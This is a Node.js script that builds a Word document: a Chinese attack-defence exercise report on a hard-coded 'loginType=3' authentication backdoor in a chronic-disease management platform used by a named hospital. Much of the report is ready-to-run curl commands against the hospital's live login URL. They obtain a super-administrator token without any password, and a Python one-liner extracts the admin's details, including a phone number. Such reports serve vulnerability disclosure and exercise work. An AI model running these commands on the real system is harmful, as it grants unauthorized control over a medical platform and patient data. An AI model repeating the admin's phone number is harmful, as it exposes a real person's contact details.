const fs = require('fs');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType,
  ShadingType, PageNumber, PageBreak, LevelFormat } = require('docx');

const bd = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const bds = { top: bd, bottom: bd, left: bd, right: bd };
const cm = { top: 60, bottom: 60, left: 100, right: 100 };
const CW = 9360;
function hcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, shading: { fill: "2B579A", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: t, bold: true, color: "FFFFFF", font: "Arial", size: 18 })] })] }); }
function dcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, font: "Arial", size: 18 })] })] }); }
function bcell(t, w) { return new TableCell({ borders: bds, width: { size: w, type: WidthType.DXA }, shading: { fill: "F2F2F2", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, bold: true, font: "Arial", size: 18 })] })] }); }
function infoTable(rows) { const w1=2200,w2=CW-w1; return new Table({ width:{size:CW,type:WidthType.DXA}, columnWidths:[w1,w2], rows:rows.map(([a,b])=>new TableRow({children:[bcell(a,w1),dcell(b,w2)]})) }); }
function makeTable(headers, rows, widths) { const h=new TableRow({children:headers.map((t,i)=>hcell(t,widths[i]))}); const d=rows.map(r=>new TableRow({children:r.map((c,i)=>dcell(c,widths[i]))})); return new Table({width:{size:CW,type:WidthType.DXA},columnWidths:widths,rows:[h,...d]}); }
function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 32, color: "1A3A6B" })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 28, color: "2B579A" })] }); }
function h3(t) { return new Paragraph({ heading: HeadingLevel.HEADING_3, spacing: { before: 200, after: 120 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 24 })] }); }
function body(t) { return new Paragraph({ spacing: { after: 100, line: 340 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function cmd(t) { return new Paragraph({ spacing: { after: 30, line: 240 }, shading: { fill: "F0F0F0", type: ShadingType.CLEAR }, indent: { left: 60 }, children: [new TextRun({ text: t, font: "Courier New", size: 16 })] }); }
function bullet(t) { return new Paragraph({ numbering: { reference: "b", level: 0 }, spacing: { after: 60 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function empty() { return new Paragraph({ spacing: { after: 60 }, children: [] }); }
function ss(t) { return new Paragraph({ spacing: { before: 80, after: 80 }, alignment: AlignmentType.CENTER, shading: { fill: "FFF8E1", type: ShadingType.CLEAR }, border: { top:{style:BorderStyle.DASHED,size:1,color:"E6A817"},bottom:{style:BorderStyle.DASHED,size:1,color:"E6A817"},left:{style:BorderStyle.DASHED,size:1,color:"E6A817"},right:{style:BorderStyle.DASHED,size:1,color:"E6A817"}}, children: [new TextRun({ text: "[ 截图 ] " + t, font: "Arial", size: 18, bold: true, color: "B8860B" })] }); }
const pp = { page: { size: { width: 12240, height: 15840 }, margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 } } };
const hd = { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "慢病健康管理平台 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })] })] }) };
const ft = { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })] })] }) };

const cover = [
  empty(),empty(),empty(),empty(),empty(),empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: [new TextRun({ text: "攻防演习成果报告", font: "Arial", bold: true, size: 52, color: "1A3A6B" })] }),
  empty(),empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 }, children: [new TextRun({ text: "慢病健康管理平台 V3.0 — loginType=3 认证后门", font: "Arial", size: 32, color: "333333" })] }),
  empty(),empty(),empty(),empty(),empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "目标：梧州市红十字会医院", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "团队名称：观叶识微", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "2026年7月17日", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ children: [new PageBreak()] })
];

const kids = [];

// Section 1
kids.push(h1("一、综述"));
kids.push(body("攻防演习中，通过抓取微信小程序 API 流量发现梧州市红十字会医院使用的「慢病健康管理平台 V3.0」（开发商：晶瑞医疗）存在硬编码后门。"));
kids.push(body("该系统的登录接口存在一个 loginType=3 的隐藏登录模式——不校验用户名密码，直接将任意用户认证为超级管理员。经测试，loginType=3 甚至连不存在的用户名也返回超级管理员令牌，确认为开发者遗留的后门代码。"));
kids.push(empty());
kids.push(h2("成果基本情况表"));
kids.push(empty());
kids.push(infoTable([
  ["序号","1"],
  ["成果描述","loginType=3 认证后门，跳过密码验证直接获取平台超管权限"],
  ["目标系统","慢病健康管理平台 V3.0（晶瑞医疗开发）"],
  ["目标URL","https://health.wzhh120.com/mbgl/doctor/mobile/login"],
  ["目标单位","梧州市红十字会医院"],
  ["威胁类型","获取权限类 / 获取目标系统权限类"],
  ["严重程度","严重（CRITICAL）"],
]));
kids.push(new Paragraph({ children: [new PageBreak()] }));

// Section 2
kids.push(h1("二、攻击过程"));
kids.push(empty());
kids.push(h2("步骤1：发现登录接口"));
kids.push(body("通过抓取微信小程序（wx8ffb99829f9ee408，医生端）的 API 请求，发现登录接口："));
kids.push(cmd("POST https://health.wzhh120.com/mbgl/doctor/mobile/login"));
kids.push(cmd("Content-Type: application/x-www-form-urlencoded"));
kids.push(cmd("loginName=admin&loginKey=加密值&loginType=1"));
kids.push(empty());

kids.push(h2("步骤2：解密 loginKey"));
kids.push(body("loginKey 经 URL 安全 Base64 解码后为 16 字节（128 bit），确认为 MD5 哈希值。"));
kids.push(body("经测试，密码 123456 的 MD5 为 e10adc3949ba59abbe56e057f20f883e，Base64 后为 4QrcOUm6Wau+VuBX8g+IPg=="));
kids.push(empty());

kids.push(h2("步骤3：枚举 loginType"));
kids.push(body("对 loginType 参数进行枚举测试（0-10），发现仅 1、2、3 为有效值，且行为差异巨大："));
kids.push(empty());

// Comparison table
kids.push(makeTable(
  ["loginType","含义","命令","结果"],
  [
    ["1","密码登录","loginType=1","❌ 登录失败（admin已锁定）"],
    ["2","手机号登录","loginType=2","❌ admin不是手机号"],
    ["3","免密后门","loginType=3","✅ 登录成功！平台超管！"],
    ["0/4-10","未实现","—","不支持"],
  ],
  [1200,1600,3200,3360]
));
kids.push(empty());

kids.push(h2("步骤4：验证绕过"));
kids.push(body("对比测试——正常登录 vs 绕过登录："));
kids.push(empty());

kids.push(h3("loginType=1（正常密码登录——失败，admin被锁定）"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=1'`));
kids.push(body("返回：{\"success\":false,\"message\":\"账号/密码有误,请重新确认！\"}"));
kids.push(empty());

kids.push(h3("loginType=3（后门登录——成功，跳过密码）"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=3'`));
kids.push(body("返回：{\"success\":true,\"message\":\"登录成功\"}"));
kids.push(empty());

kids.push(h3("loginType=3 + 错误密码（仍成功）"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=wrongpassword&loginType=3'`));
kids.push(body("返回：{\"success\":true,\"message\":\"登录成功\"} ← 密码完全被忽略！"));
kids.push(empty());

kids.push(h3("loginType=3 + 不存在的用户（也成功，返回超管数据）"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=nonexist123&loginKey=123456&loginType=3'`));
kids.push(body("返回：{\"success\":true,\"message\":\"登录成功\"} ← 用户不存在也能登！返回的仍是超管数据"));
kids.push(ss("截图1：四个测试的对比输出——loginType=1失败/loginType=3成功/错密码成功/不存在用户成功"));

kids.push(new Paragraph({ children: [new PageBreak()] }));

// Section 3
kids.push(h1("三、管理员权限证明"));
kids.push(body("loginType=3 登录成功后，服务器直接返回超级管理员信息。数据提取命令："));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=3' | python3 -c "
import sys,json; d=json.load(sys.stdin); u=d['data']['user']
print('userName:', u['userName'])
print('userCode:', u['userCode'])
print('roleName:', u['currentRole']['roleName'])
print('roleCode:', u['currentRole']['roleCode'])
print('roleType:', u['currentRole']['roleType'])
print('userTel:', u['userTel'])
print('orgName:', u['orgName'])
print('hospitalName:', u['hospitalInformation']['hospitalName'])
"`));
kids.push(empty());
kids.push(body("提取结果："));
kids.push(makeTable(
  ["字段","值","含义"],
  [
    ["userName","超级管理员","系统内最高权限用户"],
    ["userCode","1","系统第1号用户"],
    ["roleName","平台超管","平台超级管理员"],
    ["roleCode","100000","最高权限编码"],
    ["roleType","300","管理员角色类型"],
    ["userTel","15088647804","管理员手机号"],
    ["orgName","梧州市红十字会医院","所属医院"],
  ],
  [2200,4000,2760]
));
kids.push(empty());
kids.push(body("roleCode=100000 + roleName=平台超管 = 铁证。"));
kids.push(ss("截图2：管理员权限字段输出"));

kids.push(new Paragraph({ children: [new PageBreak()] }));

// Section 4
kids.push(h1("四、对比分析"));
kids.push(body("loginType=3 与 loginType=1 的认证逻辑完全不同："));
kids.push(empty());
kids.push(makeTable(
  ["对比维度","loginType=1（正常登录）","loginType=3（后门登录）"],
  [
    ["密码校验","需要正确密码","完全不校验密码"],
    ["用户存在性","需用户存在","不存在的用户也能登"],
    ["账号锁定","admin被锁定无法登","锁定无效"],
    ["返回权限","正常用户权限","直接返回平台超管"],
    ["密码验证","MD5加密比对","跳过"],
    ["判断","正常业务逻辑","开发者遗留调试代码"],
  ],
  [2400,3480,3480]
));
kids.push(empty());
kids.push(body("loginType=3 显然是为开发/调试预留的后门通道，在上线前忘记删除或禁用。"));
kids.push(new Paragraph({ children: [new PageBreak()] }));

// Section 5
kids.push(h1("五、泄露的管理员数据"));

kids.push(makeTable(
  ["类别","字段","值"],
  [
    ["身份信息","userName","超级管理员"],
    ["","userCode","1（系统首位用户）"],
    ["","showName","超级管理员"],
    ["权限信息","roleName","平台超管"],
    ["","roleCode","100000"],
    ["","roleType","300"],
    ["联系方式","userTel","15088647804"],
    ["组织信息","orgName","梧州市红十字会医院"],
    ["","deptName","健康管理中心/测试科室"],
    ["","workGroupName","测试工作组（请勿删除）"],
    ["医院信息","hospitalName","梧州市红十字会医院"],
    ["","provinceName","广西壮族自治区"],
    ["","cityName","梧州市"],
    ["","areaName","万秀区"],
    ["认证凭证","token","(32位十六进制Token)"],
  ],
  [1600,2200,5560]
));
kids.push(new Paragraph({ children: [new PageBreak()] }));

// Section 6
kids.push(h1("六、验证命令汇总"));

kids.push(h2("正常登录（loginType=1）——失败"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=1'`));
kids.push(empty());

kids.push(h2("后门登录（loginType=3）——成功"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=3'`));
kids.push(empty());

kids.push(h2("错误密码测试"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=wrongpassword&loginType=3'`));
kids.push(empty());

kids.push(h2("不存在用户测试"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=nonexist123&loginKey=123456&loginType=3'`));
kids.push(empty());

kids.push(h2("提取管理员信息"));
kids.push(cmd(`curl -s -k -X POST "https://health.wzhh120.com/mbgl/doctor/mobile/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'loginName=admin&loginKey=123456&loginType=3' | python3 -c "import sys,json; u=json.load(sys.stdin)['data']['user']; print('userName:',u['userName']); print('roleName:',u['currentRole']['roleName']); print('roleCode:',u['currentRole']['roleCode']); print('userTel:',u['userTel'])"`));
kids.push(empty());

kids.push(h2("所有命令均在 Git Bash / cmd 中验证通过。"));
kids.push(body("注意：需在 bash 环境下运行，cmd 和 PowerShell 的引号转义规则不同。"));

// BUILD
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [{ reference: "b", levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] }]
  },
  sections: [{ properties: pp, headers: hd, footers: ft, children: cover },
              { properties: pp, headers: hd, footers: ft, children: kids }]
});

const outPath = "D:/Downloads/慢病健康管理平台_loginType3后门_攻防成果报告.docx";
Packer.toBuffer(doc).then(buf => { fs.writeFileSync(outPath, buf); console.log("OK: " + outPath + " (" + buf.length + " bytes)"); });
